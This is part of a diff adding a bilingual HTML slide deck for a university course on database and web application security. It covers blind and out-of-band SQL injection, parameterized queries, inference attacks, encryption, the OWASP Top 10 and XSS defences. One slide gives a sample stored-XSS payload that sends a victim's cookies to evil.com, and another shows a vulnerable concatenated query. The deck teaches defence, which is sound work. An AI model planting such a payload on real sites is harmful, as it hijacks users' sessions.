+        <div class="card warn-top">
+          <span class="ico">👁️</span>
+          <h3 data-es="Inferencial (ciega)">Inferential (blind)</h3>
+          <p data-es="Sin transferencia directa de datos. El atacante observa el <em>comportamiento</em> de la BD:">No direct data transfer. Attacker observes DB <em>behavior</em>:</p>
+          <ul class="clean" style="margin-top:.6rem;gap:.3rem">
+            <li data-es="Tiempo de respuesta (<code>SLEEP(5)</code>)">Response time (<code>SLEEP(5)</code>)</li>
+            <li data-es="Página en blanco vs. cargada">Blank page vs. loaded page</li>
+            <li data-es="Extrae datos bit a bit">Extracts data bit by bit</li>
+          </ul>
+        </div>
+        <div class="card violet-top">
+          <span class="ico">📤</span>
+          <h3 data-es="Fuera de banda (OOB)">Out-of-band (OOB)</h3>
+          <p data-es="Los datos se exfiltran por un canal diferente: el servidor de BD hace una solicitud DNS/HTTP al servidor del atacante con los datos en la URL.">Data exfiltrated via a different channel: the DB server makes a DNS/HTTP request to the attacker's server with data in the URL.</p>
+        </div>
+      </div>
+      <div class="callout discuss" style="margin-top:.8rem"><span class="tag" data-es="Debate">Debate</span><p data-es="Si una aplicación muestra solo «Error genérico» en vez de mensajes de BD específicos, ¿desaparece el SQLi ciego? ¿El OOB? ¿Por qué sí o por qué no?">If an app shows only "Generic error" instead of specific DB messages, does blind SQLi disappear? Does OOB? Why or why not?</p></div>
+    </div>
+  </section>
+
+  <!-- ===================== E. COUNTERMEASURES ===================== -->
+
+  <!-- S20 — Section divider -->
+  <section class="slide section" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <div class="num">04</div>
+      <h1 data-es="Defensa en profundidad">Defense in depth</h1>
+      <p class="lead" data-es="Tres niveles de protección contra SQLi — y contra la inferencia.">Three levels of protection against SQLi — and against inference.</p>
+    </div>
+  </section>
+
+  <!-- S21 — Three countermeasure categories -->
+  <section class="slide" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Tres capas de defensa"><span class="dot"></span>Three defense layers</span>
+      <h2 data-es="Contramedidas contra la inyección SQL">SQL injection countermeasures</h2>
+      <div class="flow">
+        <div class="node breach">
+          <span class="n-label accent" data-es="Codificación defensiva">Defensive coding</span>
+          <span class="n-sub" data-es="• Consultas parametrizadas&#10;• Validación de entradas&#10;• SQL DOM">• Parameterized queries<br>• Input validation<br>• SQL DOM</span>
+        </div>
+        <div class="arrow">→</div>
+        <div class="node attack">
+          <span class="n-label" style="color:var(--violet)" data-es="Detección">Detection</span>
+          <span class="n-sub" data-es="• Basada en firmas&#10;• Basada en anomalías&#10;• Análisis de código">• Signature-based<br>• Anomaly-based<br>• Code analysis</span>
+        </div>
+        <div class="arrow">→</div>
+        <div class="node good-node">
+          <span class="n-label good" data-es="Prevención en tiempo de ejecución">Run-time prevention</span>
+          <span class="n-sub" data-es="Verificar las consultas en tiempo de ejecución contra un modelo de consultas esperadas">Check queries at runtime against a model of expected queries</span>
+        </div>
+      </div>
+      <div class="callout check" style="margin-top:1.2rem"><span class="tag" data-es="Regla de oro">Golden rule</span><p data-es="Usa <strong>sentencias preparadas con consultas parametrizadas</strong> — la defensa más efectiva contra SQLi. Nunca construyas sentencias SQL concatenando cadenas de entrada del usuario.">Use <strong>prepared statements with parameterized queries</strong> — the most effective SQLi defense. Never build SQL statements by concatenating user-input strings.</p></div>
+    </div>
+  </section>
+
+  <!-- S22 — Parameterized queries (vulnerable vs safe) -->
+  <section class="slide" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>La solución más efectiva"><span class="dot"></span>The most effective fix</span>
+      <h2 data-es="Vulnerable vs. seguro: consultas parametrizadas">Vulnerable vs. safe: parameterized queries</h2>
+      <div class="split">
+        <div class="card danger-top">
+          <h3 data-es="Vulnerable — concatenación de cadenas">Vulnerable — string concat</h3>
+          <div class="sql-block" style="margin-top:.8rem; font-size:.85em; padding:1rem">
+            query = <span class="sql-val">"SELECT * FROM users"</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + <span class="sql-val">" WHERE id = '"</span><br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + <span class="sql-inj">userInput</span> + <span class="sql-val">"'"</span>
+          </div>
+          <p style="margin-top:.6rem;color:var(--ink-soft)" data-es="El atacante controla el SQL que se ejecuta.">Attacker controls the SQL that runs.</p>
+        </div>
+        <div class="card good-top">
+          <h3 data-es="Seguro — consulta parametrizada">Safe — parameterized query</h3>
+          <div class="sql-block" style="margin-top:.8rem; font-size:.85em; padding:1rem">
+            query = <span class="sql-val">"SELECT * FROM users WHERE id = ?"</span><br>
+            stmt.setString(<span class="sql-col">1</span>, <span class="sql-tbl">userInput</span>)
+          </div>
+          <p style="margin-top:.6rem;color:var(--ink-soft)" data-es="La entrada del usuario es siempre un <em>valor</em>, nunca código SQL.">User input is always a <em>value</em>, never SQL code.</p>
+        </div>
+      </div>
+      <div class="callout note" style="margin-top:1rem"><span class="tag" data-es="Por qué funciona">Why it works</span><p data-es="La BD compila la plantilla SQL <em>antes</em> de que llegue la entrada del usuario. El parámetro no puede cambiar la estructura de la consulta; siempre se trata como un literal de datos.">The DB compiles the SQL template <em>before</em> user input arrives. The parameter cannot change the query structure; it is always treated as a data literal.</p></div>
+    </div>
+  </section>
+
+  <!-- S23 — Inference attack concept -->
+  <section class="slide" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Un tipo especial de amenaza"><span class="dot"></span>A special type of threat</span>
+      <h2 data-es="Ataque de inferencia: obtener secretos sin pedirlos directamente">Inference attack: getting secrets without directly asking for them</h2>
+      <div class="split">
+        <div class="card accent-top">
+          <h3 data-es="El concepto">The concept</h3>
+          <p data-es="El usuario tiene acceso <em>autorizado</em> a datos no sensibles y a metadatos, y puede <em>inferir</em> datos sensibles a los que <strong>no</strong> debería tener acceso, combinando resultados.">User has <em>authorized</em> access to non-sensitive data and metadata, and can <em>infer</em> sensitive data they should <strong>not</strong> have, by combining query results.</p>
+        </div>
+        <div class="card warn-top">
+          <h3 data-es="Ejemplo clásico">Classic example</h3>
+          <p data-es="Puedes consultar el <em>salario promedio</em> de un departamento con solo dos personas. Si ya sabes tu propio salario, deduces fácilmente el de tu colega — sin consultar directamente ese dato.">You can query the <em>average salary</em> of a two-person department. If you already know your own salary, you easily deduce your colleague's — without directly querying it.</p>
+        </div>
+      </div>
+      <div class="callout discuss" style="margin-top:1.2rem"><span class="tag" data-es="Debate">Debate</span><p data-es="Las bases de datos estadísticas (datos de salud pública, censos) deben protegerse contra la inferencia. ¿Deberías bloquear <em>todas</em> las consultas de agregación? ¿O existe una solución mejor? ¿Cuáles son las implicaciones para la utilidad de los datos?">Statistical DBs (public health data, census) must be protected from inference. Should you block <em>all</em> aggregate queries? Or is there a better solution? What are the implications for data utility?</p></div>
+    </div>
+  </section>
+
+  <!-- S24 — Inference detection + defenses against inference -->
+  <section class="slide" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Detectar y prevenir la inferencia"><span class="dot"></span>Detecting and preventing inference</span>
+      <h2 data-es="Dos enfoques + defensas prácticas">Two approaches + practical defenses</h2>
+      <div class="split">
+        <div class="card accent-top">
+          <h3 data-es="Detección durante el diseño de la BD">During DB design</h3>
+          <p data-es="Eliminar canales de inferencia antes del despliegue alterando la estructura o el control de acceso. Puede resultar en controles demasiado estrictos que reducen la disponibilidad.">Remove inference channels before deployment by altering structure or access control. May result in overly strict controls that reduce availability.</p>
+        </div>
+        <div class="card teal-top">
+          <h3 data-es="Detección en tiempo de consulta">At query time</h3>
+          <p data-es="Detectar violaciones del canal de inferencia durante la consulta. Si se detecta un canal, la consulta se deniega o se altera. Dinámico pero computacionalmente costoso.">Detect inference channel violations during the query. If a channel is detected, the query is denied or altered. Dynamic but computationally costly.</p>
+        </div>
+      </div>
+      <div class="callout note" style="margin-top:.9rem"><span class="tag" data-es="Defensas prácticas">Practical defenses</span><p data-es="(1) No permitir resultados de consultas agregadas cuando el conjunto de tuplas seleccionadas es demasiado pequeño o demasiado grande. (2) Transformar los datos eliminando identificadores: <strong>desidentificación</strong> y <strong>anonimización</strong> — hacerlo con cuidado, pues los ataques de reidentificación son reales.">( 1) Do not allow aggregate query results when the selected tuple set is too small or too large. (2) Transform data by removing identifying information: <strong>de-identification</strong> and <strong>anonymization</strong> — do carefully; re-identification attacks are real.</p></div>
+    </div>
+  </section>
+
+  <!-- S25 — Database encryption -->
+  <section class="slide" data-section="Countermeasures" data-section-es="Contramedidas">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Última línea de defensa"><span class="dot"></span>Last line of defense</span>
+      <h2 data-es="Cifrado de base de datos">Database encryption</h2>
+      <ul class="clean">
+        <li data-es="La BD es el recurso de información más valioso de una organización, protegida por <strong>múltiples capas</strong>: cortafuegos, autenticación, control de acceso y cifrado.">The DB is an org's most valuable info resource, protected by <strong>multiple layers</strong>: firewalls, authentication, access control, and encryption.</li>
+        <li data-es="El cifrado es la <strong>última línea de defensa</strong> — puede aplicarse a toda la BD, a nivel de tabla, de atributo o de campo individual.">Encryption is the <strong>last line of defense</strong> — applicable to the whole DB, table level, attribute level, or individual field.</li>
+      </ul>
+      <div class="split" style="margin-top:1rem">
+        <div class="card danger-top">
+          <h3 data-es="Inconveniente: gestión de claves">Drawback: key management</h3>
+          <p data-es="Los usuarios autorizados deben tener acceso a la clave de descifrado para sus datos. Si se pierde la clave, los datos son irrecuperables.">Authorized users must have the decryption key for their data. If the key is lost, data is unrecoverable.</p>
+        </div>
+        <div class="card warn-top">
+          <h3 data-es="Inconveniente: inflexibilidad">Drawback: inflexibility</h3>
+          <p data-es="Cuando la BD está cifrada, resulta mucho más difícil realizar búsquedas eficientes de registros, índices o consultas de rangos.">When the DB is encrypted, efficiently searching records, indexing, and range queries become much harder.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== F. OWASP & XSS ===================== -->
+
+  <!-- S26 — Section divider -->
+  <section class="slide section" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <div class="num">05</div>
+      <h1 data-es="OWASP y más allá del SQLi">OWASP &amp; beyond SQLi</h1>
+      <p class="lead" data-es="La inyección va más allá de SQL — XSS es el vector de ataque web número uno.">Injection goes beyond SQL — XSS is the #1 web attack vector.</p>
+    </div>
+  </section>
+
+  <!-- S27 — OWASP Top 10 -->
+  <section class="slide" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>El estándar de referencia de la industria"><span class="dot"></span>The industry reference standard</span>
+      <h2 data-es="OWASP Top 10: los riesgos de seguridad web más críticos">OWASP Top 10: most critical web security risks</h2>
+      <div class="split">
+        <div class="owasp-col">
+          <div class="owasp-row"><span class="ow-num">A01</span><span data-es="Control de acceso roto">Broken Access Control</span></div>
+          <div class="owasp-row"><span class="ow-num">A02</span><span data-es="Fallos criptográficos">Cryptographic Failures</span></div>
+          <div class="owasp-row highlight"><span class="ow-num">A03</span><strong>Injection</strong> ← <em data-es="aquí estamos">we are here</em></div>
+          <div class="owasp-row"><span class="ow-num">A04</span><span data-es="Diseño inseguro">Insecure Design</span></div>
+          <div class="owasp-row"><span class="ow-num">A05</span><span data-es="Configuración incorrecta de seguridad">Security Misconfiguration</span></div>
+        </div>
+        <div class="owasp-col">
+          <div class="owasp-row"><span class="ow-num">A06</span><span data-es="Componentes vulnerables y obsoletos">Vulnerable &amp; Outdated Components</span></div>
+          <div class="owasp-row"><span class="ow-num">A07</span><span data-es="Fallos de identificación y autenticación">Identification &amp; Auth Failures</span></div>
+          <div class="owasp-row"><span class="ow-num">A08</span><span data-es="Fallos en integridad de software y datos">Software &amp; Data Integrity Failures</span></div>
+          <div class="owasp-row"><span class="ow-num">A09</span><span data-es="Fallos en registro y monitoreo de seguridad">Security Logging &amp; Monitoring Failures</span></div>
+          <div class="owasp-row"><span class="ow-num">A10</span><span>Server-Side Request Forgery (SSRF)</span></div>
+        </div>
+      </div>
+      <p class="figure-note" data-es="Fuente: owasp.org — lista de consenso actualizada periódicamente por la comunidad OWASP. A03 incluye SQLi <em>y</em> XSS.">Source: owasp.org — periodically updated consensus list from the OWASP community. A03 includes SQLi <em>and</em> XSS.</p>
+    </div>
+  </section>
+
+  <!-- S28 — XSS definition -->
+  <section class="slide" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>A03: Inyección — XSS"><span class="dot"></span>A03: Injection — XSS</span>
+      <h2 data-es="Cross-Site Scripting (XSS)">Cross-Site Scripting (XSS)</h2>
+      <div class="definition">
+        <blockquote data-es="XSS ocurre cuando una aplicación acepta entradas de usuario maliciosas que ejecutan inadvertidamente código suministrado por el usuario — en el <em>navegador de la víctima</em>.">XSS occurs when an application takes in malicious user input that inadvertently executes user-supplied code — in the <em>victim's browser</em>.</blockquote>
+      </div>
+      <div class="callout note" style="margin-top:1rem"><span class="tag" data-es="La diferencia clave con SQLi">Key diff from SQLi</span><p data-es="En SQLi el atacante apunta al <strong>servidor de BD</strong>. En XSS planta código en el servidor web que después se ejecuta en el <strong>navegador de otras personas</strong>. El servidor es el intermediario — los usuarios son las víctimas.">In SQLi the attacker targets the <strong>DB server</strong>. In XSS they plant code on the web server that then executes in <strong>other people's browsers</strong>. The server is the middleman — the users are the victims.</p></div>
+      <ul class="clean" style="margin-top:1rem">
+        <li data-es="Robar cookies de sesión y secuestrar la sesión del usuario.">Steal session cookies and hijack the user's session.</li>
+        <li data-es="Redirigir al usuario a una página de phishing fraudulenta.">Redirect the user to a fraudulent phishing page.</li>
+        <li data-es="Instalar un keylogger o descargar malware en el equipo de la víctima.">Install a keylogger or download malware onto the victim's machine.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- S29 — XSS types -->
+  <section class="slide" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Dos tipos principales de XSS"><span class="dot"></span>Two main types of XSS</span>
+      <h2 data-es="XSS almacenado vs. reflejado">Stored vs. Reflected XSS</h2>
+      <div class="split">
+        <div class="card danger-top">
+          <h3 data-es="XSS almacenado (persistente)">Stored (persistent) XSS</h3>
+          <p data-es="El script malicioso se <strong>guarda en el servidor</strong> (p. ej., foro, caja de comentarios, perfil de usuario). Cualquier visitante posterior ejecuta el script — sin hacer nada especial.">Malicious script is <strong>saved on the server</strong> (e.g., forum, comment box, user profile). Any subsequent visitor runs the script — without doing anything special.</p>
+          <p style="margin-top:.6rem;color:var(--ink-soft);font-size:var(--fs-small)" data-es="Ejemplo: atacante publica <code>&lt;script&gt;location.href='evil.com?c='+document.cookie&lt;/script&gt;</code> en un foro.">Example: attacker posts <code>&lt;script&gt;location.href='evil.com?c='+document.cookie&lt;/script&gt;</code> in a forum.</p>
+        </div>
+        <div class="card warn-top">
+          <h3 data-es="XSS reflejado (no persistente)">Reflected (non-persistent) XSS</h3>
+          <p data-es="El script <strong>no se almacena</strong>; está incrustado en una URL maliciosa que el atacante envía a la víctima. Requiere que la víctima haga clic en el enlace (p. ej., correo de phishing).">Script is <strong>not stored</strong>; embedded in a malicious URL sent to the victim. Requires the victim to click the link (e.g., phishing email).</p>
+          <p style="margin-top:.6rem;color:var(--ink-soft);font-size:var(--fs-small)" data-es="Entrega: correo de phishing con un enlace que contiene el payload XSS en el parámetro de la URL.">Delivery: phishing email with a link containing the XSS payload in the URL parameter.</p>
+        </div>
+      </div>
+      <div class="callout discuss" style="margin-top:.9rem"><span class="tag" data-es="Debate">Debate</span><p data-es="El XSS almacenado afecta a <em>todos</em> los visitantes futuros sin que hagan nada. El XSS reflejado requiere que la víctima haga clic. ¿Cuál es más peligroso? ¿Y cuál es más probable que pase desapercibido durante más tiempo?">Stored XSS affects <em>all</em> future visitors with no action on their part. Reflected XSS requires the victim to click. Which is more dangerous? And which is more likely to go undetected longer?</p></div>
+    </div>
+  </section>
+
+  <!-- S30 — XSS scenario (flow) -->
+  <section class="slide" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Cómo se propaga un ataque XSS almacenado"><span class="dot"></span>How a stored XSS attack propagates</span>
+      <h2 data-es="El ataque de la bicicleta — paso a paso">The bike forum attack — step by step</h2>
+      <div class="flow">
+        <div class="node breach"><span class="n-label accent" data-es="Atacante publica script en el foro">Attacker posts script in forum</span><span class="n-sub"><code>&lt;script&gt;...&lt;/script&gt;</code></span></div>
+        <div class="arrow">→</div>
+        <div class="node attack"><span class="n-label" style="color:var(--violet)" data-es="Servidor almacena el script">Server stores script</span><span class="n-sub" data-es="en la BD, sin saneamiento">in DB, unsanitized</span></div>
+        <div class="arrow">→</div>
+        <div class="node vuln"><span class="n-label warn" data-es="Víctima visita la página">Victim visits page</span><span class="n-sub" data-es="el servidor devuelve el script en la página">server returns script in HTML</span></div>
+        <div class="arrow">→</div>
+        <div class="node threat"><span class="n-label danger" data-es="Script ejecutado en el navegador de la víctima">Script runs in victim's browser</span><span class="n-sub" data-es="robo de cookies · redirección · malware">cookie theft · redirect · malware</span></div>
+      </div>
+      <div class="callout note" style="margin-top:1rem"><span class="tag" data-es="Por qué funciona">Why it works</span><p data-es="El navegador confía en el HTML/JS que recibe del servidor. Si el servidor devuelve código malicioso como parte de la página, el navegador <em>no tiene forma de saber</em> que no es legítimo — todo parece venir del sitio de confianza.">The browser trusts HTML/JS it receives from the server. If the server returns malicious code as part of the page, the browser <em>has no way to know</em> it isn't legitimate — it all appears to come from the trusted site.</p></div>
+    </div>
+  </section>
+
+  <!-- S31 — XSS mitigation -->
+  <section class="slide" data-section="OWASP &amp; XSS" data-section-es="OWASP y XSS">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Mitigación del XSS"><span class="dot"></span>XSS mitigation</span>
+      <h2 data-es="Validación de entradas + codificación de salida + CSP">Input validation + output encoding + CSP</h2>
+      <div class="grid cols-3">
+        <div class="card good-top"><span class="ico">✅</span><h3 data-es="Validación de entradas">Input validation</h3><p data-es="Rechazar entradas que contengan etiquetas de script o HTML. <strong>Regla de oro: toda entrada es maliciosa hasta que se demuestre lo contrario.</strong>">Reject inputs containing script/HTML tags. <strong>Golden rule: all input is evil until proven otherwise.</strong></p></div>
+        <div class="card teal-top"><span class="ico">🔤</span><h3 data-es="Codificación de salida">Output encoding</h3><p data-es="Al mostrar datos del usuario, codificar los caracteres especiales HTML: <code>&lt;</code> → <code>&amp;lt;</code>. El navegador muestra texto — no lo ejecuta.">When displaying user data, encode HTML special chars: <code>&lt;</code> → <code>&amp;lt;</code>. The browser displays text — doesn't execute it.</p></div>
+        <div class="card accent-top"><span class="ico">🛡️</span><h3>CSP</h3><p data-es="La <strong>Política de Seguridad de Contenido</strong> le indica al navegador qué fuentes de scripts están permitidas. Actúa como red de seguridad incluso si escapa algún XSS."><strong>Content Security Policy</strong> tells the browser which script sources are allowed. Acts as a safety net even if XSS slips through.</p></div>
+      </div>
+      <div class="callout check" style="margin-top:.9rem"><span class="tag" data-es="Del lado del servidor vs. del cliente">Server vs. client side</span><p data-es="Para XSS <strong>almacenado</strong>: sanea las entradas en el <em>servidor</em> antes de guardarlas. Para XSS <strong>reflejado</strong>: la validación del lado del cliente ayuda, pero el servidor <em>también</em> debe validar — nunca confíes únicamente en el cliente.">For <strong>stored</strong> XSS: sanitize inputs on the <em>server</em> before saving. For <strong>reflected</strong> XSS: client-side validation helps, but the server <em>must also</em> validate — never trust the client alone.</p></div>
+    </div>
+  </section>
+
+  <!-- ===================== G. WRAP-UP ===================== -->
+
+  <!-- S32 — Summary -->
+  <section class="slide" data-section="Wrap-up" data-section-es="Cierre">
+    <div class="slide-inner">
+      <span class="kicker" data-es="<span class='dot'></span>Resumen"><span class="dot"></span>Summary</span>
+      <h2 data-es="Seguridad en BD y aplicaciones, en una diapositiva">Database &amp; application security, in one slide</h2>
+      <ul class="clean">
+        <li data-es="Las aplicaciones web son puntos de entrada — la <strong>BD es el objetivo real</strong>. La defensa debe operar en ambas capas.">Web apps are entry points — the <strong>DB is the real target</strong>. Defense must operate at both layers.</li>
+        <li data-es="Los requisitos de seguridad de BD cubren cinco áreas: integridad física, lógica y de elementos, auditabilidad y control de acceso.">DB security requirements span five areas: physical, logical, and element integrity, auditability, and access control.</li>
+        <li data-es="SQLi puede eliminarse casi por completo con <strong>consultas parametrizadas</strong>. La validación de entradas y la prevención en tiempo de ejecución aportan capas adicionales.">SQLi can be nearly eliminated with <strong>parameterized queries</strong>. Input validation and run-time prevention add extra layers.</li>
+        <li data-es="XSS es el ataque web más frecuente (≈ 39 %). La validación de entradas, la codificación de salida y la CSP son las principales defensas.">XSS is the most frequent web attack (≈ 39 %). Input validation, output encoding, and CSP are the main defenses.</li>
+        <li data-es="El <strong>OWASP Top 10</strong> es la referencia estándar de la industria para los riesgos de seguridad en aplicaciones web — conócelo.">The <strong>OWASP Top 10</strong> is the industry-standard reference for web app security risks — know it.</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- S33 — Closing debate -->
+  <section class="slide activity" data-section="Wrap-up" data-section-es="Cierre">
+    <div class="slide-inner">
+      <span class="badge" data-es="◆ Debate final">◆ Closing debate</span>
+      <h2 style="margin-top:1rem" data-es="¿Es la validación de entradas suficiente?">Is input validation enough?</h2>
+      <p class="lead" style="max-width:56ch" data-es="Una aplicación valida y escapa <em>todas</em> las entradas del usuario en cada capa. Aun así, se produce una brecha. ¿Cómo podría ser eso posible?">An application validates and escapes <em>all</em> user inputs at every layer. Yet a breach still occurs. How could that be possible?</p>
+      <div class="reveal-answer fragment">
+        <span class="ra-tag" data-es="Posibles respuestas">Possible answers</span>
+        <p data-es="• <strong>Inyección de segundo orden</strong>: datos almacenados de forma segura, usados inseguramente más tarde. • El atacante <strong>evita la capa de la aplicación</strong> completamente (credenciales de BD robadas, consola de administración expuesta). • <strong>Ataques de inferencia</strong>: sin inyección, solo consultas legítimas combinadas. • <strong>Vulnerabilidades en dependencias de terceros</strong> (la librería de tu proveedor ORM tiene un bug). • <strong>Error de configuración</strong>: la BD tiene permisos de red excesivos o credenciales débiles.">• <strong>Second-order injection</strong>: data stored safely, used unsafely later. • Attacker <strong>bypasses the app layer</strong> entirely (stolen DB credentials, exposed admin console). • <strong>Inference attacks</strong>: no injection, just legitimate queries combined. • <strong>Third-party dependency vulnerabilities</strong> (your ORM library has a bug). • <strong>Misconfiguration</strong>: the DB has excessive network access or weak credentials.</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <span class="course" data-es="TC2007B · S3 · C1 — Seguridad en BD y App">TC2007B · W3 · L1 — Database &amp; App Security</span>
+  <span class="right">
+    <span class="sec-name" id="secName">Orientation</span>
+    <span class="counter"><span id="cur">1</span> / <span id="total">33</span></span>
+  </span>
+</footer>
+
+<div class="frag-hint" id="fragHint"><span id="fragHintText">click to reveal</span><span class="chev">▾</span></div>
+
+<div class="nav-btns">
+  <button id="prevBtn" title="Previous (←)">‹</button>
+  <button id="ovBtn" title="Overview (O)">▦</button>
+  <button id="helpBtn" title="Help (?)">?</button>
+  <button id="fsBtn" title="Fullscreen (F)">⛶</button>
+  <button id="nextBtn" title="Next (→)">›</button>
+</div>
+
+<div class="overview" id="overview">
+  <h2 id="ovTitle">Slide overview</h2>
+  <div class="ov-grid" id="ovGrid"></div>
+</div>
+
+<div class="help" id="help">
+  <div class="panel">
+    <h2 data-es="Navegación">Navigation</h2>
+    <table>
+      <tr><td><kbd>→</kbd> <kbd>Space</kbd> <kbd>PgDn</kbd></td><td data-es="Siguiente / revelar">Next / reveal</td></tr>
+      <tr><td><kbd>←</kbd> <kbd>PgUp</kbd></td><td data-es="Anterior">Previous</td></tr>
+      <tr><td><kbd>Home</kbd> / <kbd>End</kbd></td><td data-es="Primera / última">First / last slide</td></tr>
+      <tr><td><kbd>O</kbd></td><td data-es="Vista general">Slide overview grid</td></tr>
+      <tr><td><kbd>F</kbd></td><td data-es="Pantalla completa">Toggle fullscreen</td></tr>
+      <tr><td><kbd>L</kbd></td><td data-es="Idioma ES / EN">Language ES / EN</td></tr>
+      <tr><td><kbd>T</kbd></td><td data-es="Tema claro / oscuro">Light / dark theme</td></tr>
+      <tr><td><kbd>?</kbd></td><td>Help</td></tr>
+      <tr><td><kbd>Esc</kbd></td><td data-es="Cerrar ventana">Close overlay</td></tr>
+    </table>
+  </div>
+</div>
+
+<script src="script.js"></script>
+</body>
+</html>
